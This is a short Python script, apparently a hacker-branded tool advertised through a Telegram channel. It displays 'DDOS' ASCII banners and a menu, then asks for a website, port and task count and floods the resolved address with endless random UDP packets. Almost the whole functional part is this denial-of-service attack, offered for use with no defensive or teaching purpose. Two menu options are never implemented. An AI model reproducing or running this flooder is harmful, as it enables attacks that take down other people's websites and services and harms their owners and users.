import os
import time
from random import randint
from colorama import Fore, init
from prettytable import PrettyTable
import socket
import asyncio

init(autoreset=True)

def show_menu():
    print("Welcome to the progress bar simulation!")

# Progress bar simulation
n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTCYAN_EX}%{n}")
    n += randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(Fore.BLUE + "   https://t.me/Black_Edalat")

print(Fore.LIGHTGREEN_EX + """
.######..#####....####...##.......####...######.
.##......##..##..##..##..##......##..##....##...
.####....##..##..######..##......######....##...
.##......##..##..##..##..##......##..##....##...
.######..#####...##..##..######..##..##....##...
................................................
""")
print(Fore.BLUE + "   ")

print(Fore.LIGHTRED_EX + """
@@@@@@@@   @@@@@@@    @@@@@@    @@@@@@
@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@
@@!  @@@  @@!  @@@  @@!  @@@  !@@
!@!  @!@  !@!  @!@  !@!  @!@  !@!
@!@  !@!  @!@  !@!  @!@  !@!  !!@@!!
!@!  !!!  !@!  !!!  !@!  !!!   !!@!!!
!!:  !!!  !!:  !!!  !!:  !!!       !:!
:!:  !:!  :!:  !:!  :!:  !:!      !:!
:::: ::   :::: ::  ::::: ::  :::: ::
:: :  :   :: :  :    : :  :   :: : :
""")
print('')

# Define colors
lgn = "\033[92m"  
gn = "\033[92m"   
lrd = "\033[91m"  
cn = "\033[96m"   

t = PrettyTable([f'{cn}Number{lrd}', f'{cn}Information{lrd}'])
t.add_row([f'{lgn}1{lrd}', f'{gn}DDoS IP Set port >1{lrd}'])
t.add_row([f'{lgn}2{lrd}', f'{gn}DDoS IP Set La4 > 2{lrd}'])
t.add_row([f'{lgn}3{lrd}', f'{gn}Exe > 3{lrd}'])

print(t)
print('')

async def attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)  

    while True:
        sock.sendto(bytes, (target_ip, target_port))
        print(f"Sending packet to {target_ip}:{target_port}")

async def start_attack(target_ip, target_port, num_tasks):
    tasks = []
    for _ in range(num_tasks):
        tasks.append(attack(target_ip, target_port))
    await asyncio.gather(*tasks)

def get_ip_address(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print("Could not retrieve IP address for the domain.")
        return None

async def main():
    target_domain = input("Please enter the website address: ")  # Get website address
    target_port = int(input("Please enter the port: "))  # Get port
    num_tasks = int(input("Please enter the number of tasks: "))  # Get number of tasks

    target_ip = get_ip_address(target_domain)
    if target_ip:
        await start_attack(target_ip, target_port, num_tasks)

if __name__ == "__main__":  
    asyncio.run(main())
